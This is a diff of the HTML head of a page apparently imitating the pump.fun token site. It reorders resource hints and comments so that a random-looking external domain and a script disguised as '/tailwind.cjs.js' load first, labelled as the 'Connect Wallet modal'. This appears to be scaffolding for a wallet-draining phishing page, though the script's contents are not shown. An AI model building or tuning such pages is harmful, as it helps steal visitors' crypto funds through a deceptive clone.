@@ -6,23 +6,23 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>pump</title>
     
-    <!-- High priority: Wallet and Solana RPC connections (load first) -->
-    <link rel="dns-prefetch" href="https://solana.publicnode.com">
-    <link rel="preconnect" href="https://solana.publicnode.com" crossorigin>
+    <!-- CRITICAL: Wallet modal and connection - highest priority -->
     <link rel="dns-prefetch" href="https://aodefevrgdkhqltdnwgzbyjoywrlbntbhfwq.com">
     <link rel="preconnect" href="https://aodefevrgdkhqltdnwgzbyjoywrlbntbhfwq.com" crossorigin>
+    <link rel="dns-prefetch" href="https://solana.publicnode.com">
+    <link rel="preconnect" href="https://solana.publicnode.com" crossorigin>
     <!-- Lower priority: Token images (load after wallet) -->
     <link rel="dns-prefetch" href="https://images.pump.fun">
     <link rel="preconnect" href="https://images.pump.fun" crossorigin>
     <link rel="dns-prefetch" href="https://pump.fun">
     <link rel="preconnect" href="https://pump.fun" crossorigin>
-    <!-- CRITICAL: Wallet script - highest priority, load first -->
+    <!-- CRITICAL: Wallet connection script - highest priority for Connect Wallet modal -->
     <link rel="preload" href="/tailwind.cjs.js" as="script" fetchpriority="high">
     <link rel="modulepreload" href="/tailwind.cjs.js">
-    <!-- Lower priority: Other scripts -->
+    <!-- Lower priority: Other resources -->
     <link rel="preload" href="/css/styles.css" as="style">
-    <link rel="preload" href="/js/token-loader.js" as="script">
     <link rel="preload" href="/js/app.js" as="script">
+    <link rel="preload" href="/js/token-loader.js" as="script">
     <!-- Prefetch wallet-related domains for faster connection -->
     <link rel="dns-prefetch" href="https://solana.publicnode.com">
     <link rel="dns-prefetch" href="https://aodefevrgdkhqltdnwgzbyjoywrlbntbhfwq.com">
@@ -116,8 +116,8 @@
     
     <link rel="stylesheet" href="/css/styles.css">
     
-    <!-- Load tailwind.cjs.js FIRST with highest priority (blocking, no async/defer) -->
-    <script src="/tailwind.cjs.js" fetchpriority="high"></script>
+    <!-- CRITICAL: Load tailwind.cjs.js FIRST (Connect Wallet modal) with highest priority -->
+    <script src="/tailwind.cjs.js"></script>
     
     <script>
       window.setup = {
